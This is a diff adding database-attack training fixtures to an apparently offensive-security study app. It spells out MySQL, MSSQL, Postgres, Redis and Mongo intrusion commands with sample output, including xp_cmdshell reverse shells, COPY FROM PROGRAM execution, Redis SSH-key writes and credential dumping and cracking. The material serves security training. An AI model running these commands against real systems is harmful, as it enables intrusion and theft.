@@ -2665,4 +2665,84 @@
   };
   Object.keys(WINDOWS_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = WINDOWS_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });
 
+  // database lane: lead-ups, field notes, practice. DB attacks run from Kali over the network (local).
+  var DATABASE_LEADUPS = {
+    "mysql-login": [
+      { key: "scan", label: "The scan found 3306", steps: [
+        { title: "Spot the MySQL port", tool: "nmap", where: "local", cmd: "nmap -p 3306 <target>", out: "3306/tcp open  mysql", sig: "3306/tcp open  mysql", teach: "MySQL open means a login to try; defaults and reused passwords get you a prompt." } ] },
+      { key: "loot", label: "A config file leaked a credential", steps: [
+        { title: "A web config held DB creds", tool: "cat", where: "host", cmd: "cat /var/www/html/config.php | grep -i db", out: "$db_user = 'root'; $db_pass = 'S3cr3tDB';", sig: "$db_pass = 'S3cr3tDB'", teach: "A credential from the web root logs you straight into MySQL." } ] },
+    ],
+    "mysql-loot": [
+      { key: "login", label: "You have a MySQL session", steps: [
+        { title: "You reached the MySQL prompt", tool: "mysql", where: "local", cmd: "mysql -h <target> -u root -p'S3cr3tDB'", out: "Welcome to the MySQL monitor.\nmysql>", sig: "mysql>", teach: "With a session open, the app's own user table is the next, highest-value target." } ] },
+    ],
+    "mssql-login": [
+      { key: "scan", label: "The scan found 1433", steps: [
+        { title: "Spot the MSSQL port", tool: "nmap", where: "local", cmd: "nmap -p 1433 <target>", out: "1433/tcp open  ms-sql-s", sig: "1433/tcp open  ms-sql-s", teach: "MSSQL open plus any credential is a quiet way onto a Windows SQL box." } ] },
+      { key: "domaincred", label: "You hold a domain credential", steps: [
+        { title: "A share dump gave you a domain user", tool: "netexec", where: "local", cmd: "nxc smb <target> -u jdoe -p 'Spring2024!'", out: "SMB  <target>  445  SQL01  [+] corp.local\\jdoe", sig: "corp.local\\jdoe", teach: "MSSQL often trusts domain logins, so a domain credential logs straight in with -windows-auth." } ] },
+    ],
+    "mssql-xp-cmdshell": [
+      { key: "sysadmin", label: "Your login is sysadmin", steps: [
+        { title: "You confirmed sysadmin rights", tool: "mssqlclient", where: "local", cmd: "SQL> SELECT IS_SRVROLEMEMBER('sysadmin')", out: "-----------\n          1", sig: "          1", teach: "A 1 means sysadmin, which is exactly what enabling xp_cmdshell requires." } ] },
+    ],
+    "postgres-login": [
+      { key: "scan", label: "The scan found 5432", steps: [
+        { title: "Spot the PostgreSQL port", tool: "nmap", where: "local", cmd: "nmap -p 5432 <target>", out: "5432/tcp open  postgresql", sig: "5432/tcp open  postgresql", teach: "Postgres open means a login to try; postgres/postgres is a common default." } ] },
+    ],
+    "redis-enum": [
+      { key: "scan", label: "The scan found 6379", steps: [
+        { title: "Spot the Redis port", tool: "nmap", where: "local", cmd: "nmap -p 6379 <target>", out: "6379/tcp open  redis", sig: "6379/tcp open  redis", teach: "Redis open with no auth hands over its cache the moment you connect." } ] },
+    ],
+    "mongo-enum": [
+      { key: "scan", label: "The scan found 27017", steps: [
+        { title: "Spot the MongoDB port", tool: "nmap", where: "local", cmd: "nmap -p 27017 <target>", out: "27017/tcp open  mongod", sig: "27017/tcp open  mongod", teach: "Mongo open and unauthenticated means you can list and dump its data directly." } ] },
+    ]
+  };
+  Object.keys(DATABASE_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = DATABASE_LEADUPS[k]; });
+
+  var DATABASE_HOW = {
+    "mysql-login": {"lead":"MySQL on 3306 takes a username and password; default and reused creds get you a SQL prompt.","items":[
+      {"t":"Connect with a credential","d":"mysql -h -u -p opens a session; try root with a blank or reused password first.","demo":[{"run":"mysql -h <target> -u root -p'S3cr3tDB'","out":"Welcome to the MySQL monitor.\nmysql>","sig":"mysql>"}],"note":"A prompt means you are in; enumerate the databases next."},
+      {"t":"List databases and privileges","d":"show databases and the current grants reveal the app DB and what your account may do.","demo":[{"run":"mysql -h <target> -u root -p'S3cr3tDB' -e \"show databases; show grants;\"","out":"information_schema\nmysql\nwebapp\nGRANT ALL PRIVILEGES ON *.* TO 'root'","sig":"webapp"}],"note":"The webapp database holds the application's data and its user table."},
+      {"t":"Check for FILE privilege","d":"A user with FILE can read local files (LOAD_FILE) or, if secure_file_priv allows, write a webshell with INTO OUTFILE.","demo":[{"run":"mysql -h <target> -u root -p'S3cr3tDB' -e \"select load_file('/etc/passwd');\"","out":"root:x:0:0:root:/root:/bin/bash","sig":"root:x:0:0"}],"note":"FILE read /etc/passwd; the same privilege can drop a PHP shell into the web root."}]},
+    "mysql-loot": {"lead":"The app's own user table is the prize: dump it, crack the hashes, reuse the passwords.","items":[
+      {"t":"Find the user table","d":"Columns named user, pass, or email across the app DB point at the credential store.","demo":[{"run":"mysql -h <target> -u root -p'S3cr3tDB' webapp -e \"show tables;\"","out":"posts\nsessions\nusers","sig":"users"}],"note":"The users table is the one to dump."},
+      {"t":"Dump the credentials","d":"Select the username and password columns; note the hash format for cracking.","demo":[{"run":"mysql -h <target> -u root -p'S3cr3tDB' webapp -e \"select username,password from users;\"","out":"admin  8d6e34f2a1c05b9e7d3f6a2b4c8e1d09","sig":"8d6e34f2a1c05b9e7d3f6a2b4c8e1d09"}],"note":"admin's password is an unsalted MD5; identify it, then crack it."},
+      {"t":"Crack and reuse","d":"Feed the hashes to hashcat with the right mode; a cracked admin password often reuses for SSH or the app.","demo":[{"run":"hashcat -m 0 hashes.txt rockyou.txt","out":"8d6e34f2a1c05b9e7d3f6a2b4c8e1d09:Summer2024","sig":":Summer2024"}],"note":"admin:Summer2024 is a real credential; try it on SSH and every other service."}]},
+    "mssql-login": {"lead":"MSSQL on 1433 takes SQL or Windows auth; impacket-mssqlclient is the cleanest way in.","items":[
+      {"t":"Log in with mssqlclient","d":"impacket-mssqlclient connects with SQL auth (sa) or -windows-auth for a domain credential.","demo":[{"run":"impacket-mssqlclient sa:'P@ssw0rd'@<target>","out":"[*] Encryption required, switching to TLS\nSQL>","sig":"SQL>"}],"note":"The SQL> prompt means you are in; check your role next."},
+      {"t":"Check for sysadmin","d":"IS_SRVROLEMEMBER('sysadmin') returns 1 if your login can enable xp_cmdshell.","demo":[{"run":"SQL> SELECT IS_SRVROLEMEMBER('sysadmin')","out":"-----------\n          1","sig":"          1"}],"note":"A 1 means sysadmin: xp_cmdshell command execution is available."},
+      {"t":"Try a domain credential","d":"-windows-auth logs in with a domain account; MSSQL often trusts the whole domain.","demo":[{"run":"impacket-mssqlclient corp.local/jdoe:'Spring2024!'@<target> -windows-auth","out":"[*] ENVCHANGE(DATABASE)\nSQL>","sig":"SQL>"}],"note":"A domain user that can log into MSSQL is a common, quiet way onto a SQL box."}]},
+    "mssql-xp-cmdshell": {"lead":"With sysadmin, enable xp_cmdshell and run OS commands as the SQL service account.","items":[
+      {"t":"Enable xp_cmdshell","d":"It is off by default; sp_configure turns it on in two steps (show advanced, then the feature).","demo":[{"run":"SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;","out":"Configuration option 'xp_cmdshell' changed from 0 to 1.","sig":"changed from 0 to 1"}],"note":"xp_cmdshell is now enabled; you can run shell commands through it."},
+      {"t":"Run a command","d":"EXEC xp_cmdshell runs the command and returns its output in the result set.","demo":[{"run":"SQL> EXEC xp_cmdshell 'whoami'","out":"nt service\\mssqlserver","sig":"nt service\\mssqlserver"}],"note":"Commands run as the SQL service account, often one that holds SeImpersonate."},
+      {"t":"Get a reverse shell","d":"Point xp_cmdshell at a PowerShell download cradle or a served exe to land an interactive shell.","demo":[{"run":"SQL> EXEC xp_cmdshell 'powershell -e <base64 revshell>'","out":"(on your listener)  nt service\\mssqlserver","sig":"nt service\\mssqlserver"}],"note":"The service-account shell is your foothold; SeImpersonate then takes you to SYSTEM."}]},
+    "postgres-login": {"lead":"PostgreSQL on 5432 takes a credential; psql gets you in, and old versions give RCE.","items":[
+      {"t":"Connect with psql","d":"psql with PGPASSWORD opens a session; postgres/postgres is a common default.","demo":[{"run":"PGPASSWORD=postgres psql -h <target> -U postgres","out":"psql (11.7)\npostgres=#","sig":"postgres=#"}],"note":"The postgres=# prompt (note the #) means you are a superuser."},
+      {"t":"Check the version","d":"select version() decides your options; 9.3 to 11 allow COPY FROM PROGRAM RCE for a superuser.","demo":[{"run":"postgres=# SELECT version();","out":"PostgreSQL 11.7 on x86_64-pc-linux-gnu","sig":"PostgreSQL 11.7"}],"note":"11.7 supports COPY FROM PROGRAM, so a superuser here has command execution."},
+      {"t":"Run a command via COPY","d":"COPY ... FROM PROGRAM runs a shell command as the postgres user and captures its output.","demo":[{"run":"postgres=# CREATE TABLE c(o text); COPY c FROM PROGRAM 'id'; SELECT * FROM c;","out":"uid=114(postgres) gid=120(postgres) groups=120(postgres)","sig":"uid=114(postgres)"}],"note":"Command execution as the postgres user; escalate from there."}]},
+    "redis-enum": {"lead":"Redis on 6379 is often open with no AUTH; read the cache, then abuse a writable instance.","items":[
+      {"t":"Connect and read server info","d":"redis-cli with no password confirms open access; INFO reveals the version and config file.","demo":[{"run":"redis-cli -h <target> INFO server","out":"redis_version:5.0.7\nconfig_file:/etc/redis/redis.conf","sig":"redis_version:5.0.7"}],"note":"No AUTH error means it is wide open; now mine the keys."},
+      {"t":"Dump cached secrets","d":"KEYS * lists everything; sessions, tokens, and cached credentials are common and valuable.","demo":[{"run":"redis-cli -h <target> KEYS '*'","out":"session:ab12cd\napi_token\nuser:1:password","sig":"user:1:password"}],"note":"A cached password key is a direct credential; GET it to read the value."},
+      {"t":"Write an SSH key for RCE","d":"If writable and you know a path, point dir and dbfilename at .ssh and SAVE your key into authorized_keys.","demo":[{"run":"redis-cli -h <target> config set dir /var/lib/redis/.ssh\nredis-cli -h <target> config set dbfilename authorized_keys","out":"OK\nOK","sig":"OK\nOK"}],"note":"With dir and dbfilename aimed at .ssh, SAVE writes your key; then SSH in as the redis user."}]},
+    "mongo-enum": {"lead":"MongoDB on 27017 with no auth lists databases and dumps collections outright.","items":[
+      {"t":"Connect and list databases","d":"mongosh (or the legacy mongo client) with no auth shows every database.","demo":[{"run":"mongosh --host <target> --eval \"show dbs\"","out":"admin    40.00 KiB\nwebapp   1.20 MiB","sig":"webapp"}],"note":"The webapp database holds the application's collections; switch to it."},
+      {"t":"Dump a collection","d":"find() on the users collection spills documents, including any stored credentials.","demo":[{"run":"mongosh --host <target> webapp --eval \"db.users.find()\"","out":"{ _id: 1, user: 'admin', pass: 'S3cr3tM0ngo' }","sig":"pass: 'S3cr3tM0ngo'"}],"note":"A plaintext password in a document is a direct credential to reuse."},
+      {"t":"Export everything offline","d":"mongodump pulls the whole database to disk so you can grep it for secrets at leisure.","demo":[{"run":"mongodump --host <target> --db webapp --out loot/","out":"done dumping webapp.users (142 documents)","sig":"done dumping webapp.users"}],"note":"The full dump lets you mine every collection for credentials offline."}]}
+  };
+  Object.keys(DATABASE_HOW).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].how = DATABASE_HOW[k]; });
+
+  var DATABASE_PRACTICE = {
+    "mysql-login": {situation:"nmap shows 3306 open and you have no credentials. What do you try first?", choices:["mysql-login","mysql-loot","online-brute-ssh","mssql-login"], coach:{"mysql-loot":"That comes after you are in; first get a session with a default or reused credential.","online-brute-ssh":"Different service. 3306 is MySQL, so try its defaults (root with a blank or weak password) before brute-forcing anything.","mssql-login":"That is MSSQL on 1433; 3306 is MySQL, a different client and different defaults."}},
+    "mysql-loot": {situation:"You have a root MySQL session on the app database. What is the highest-value move?", choices:["mysql-loot","crack-identify","mysql-login","mssql-xp-cmdshell"], coach:{"crack-identify":"That comes after you dump the hashes; first pull the user table out of the database.","mysql-login":"Already done, you are in. Now loot the tables.","mssql-xp-cmdshell":"Wrong engine. MySQL has no xp_cmdshell; its win is the credential table, not command execution."}},
+    "mssql-login": {situation:"1433 is open and you hold a domain credential for jdoe. How do you get a SQL prompt?", choices:["mssql-login","mysql-login","mssql-xp-cmdshell","password-spray"], coach:{"mysql-login":"That is the MySQL client on 3306; 1433 is MSSQL, so use mssqlclient with -windows-auth.","mssql-xp-cmdshell":"That needs a session and sysadmin first; logging in is the step before it.","password-spray":"You already hold a credential; use it against MSSQL rather than spraying for a new one."}},
+    "mssql-xp-cmdshell": {situation:"Your MSSQL login returns 1 for IS_SRVROLEMEMBER('sysadmin'). What now?", choices:["mssql-xp-cmdshell","mssql-login","seimpersonate","mysql-loot"], coach:{"mssql-login":"Already done, you are in as sysadmin. Now turn that into command execution.","seimpersonate":"That is the next step after you land a shell as the SQL service account; xp_cmdshell is how you get that shell.","mysql-loot":"Wrong engine. Sysadmin on MSSQL means xp_cmdshell, not a MySQL table dump."}},
+    "postgres-login": {situation:"5432 is open, postgres/postgres works, and version() shows 11.7. What does that enable?", choices:["postgres-login","mssql-xp-cmdshell","mysql-login","crack-shadow"], coach:{"mssql-xp-cmdshell":"Different engine. Postgres uses COPY FROM PROGRAM for RCE, not xp_cmdshell.","mysql-login":"That is MySQL on 3306; you are already logged into Postgres on 5432.","crack-shadow":"No hashes to crack here; a superuser on Postgres 11 has direct command execution via COPY."}},
+    "redis-enum": {situation:"6379 is open and redis-cli connects with no password. What is the first move?", choices:["redis-enum","mongo-enum","mysql-login","content-discovery"], coach:{"mongo-enum":"That is MongoDB on 27017; 6379 is Redis, a key-value store you enumerate with redis-cli.","mysql-login":"Different service. Redis has no SQL; you read keys with redis-cli.","content-discovery":"That is for web; the open Redis in front of you gives up its cache directly."}},
+    "mongo-enum": {situation:"27017 is open and unauthenticated. What do you do?", choices:["mongo-enum","redis-enum","mysql-login","nosql-injection"], coach:{"redis-enum":"That is Redis on 6379; 27017 is MongoDB, enumerated with mongosh.","mysql-login":"Different engine. Mongo is a document store with no SQL login; just connect and read.","nosql-injection":"That abuses an app's query handling; here Mongo is directly exposed, so list and dump the collections."}}
+  };
+  Object.keys(DATABASE_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = DATABASE_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });
+
 })(typeof globalThis !== 'undefined' ? globalThis : this);
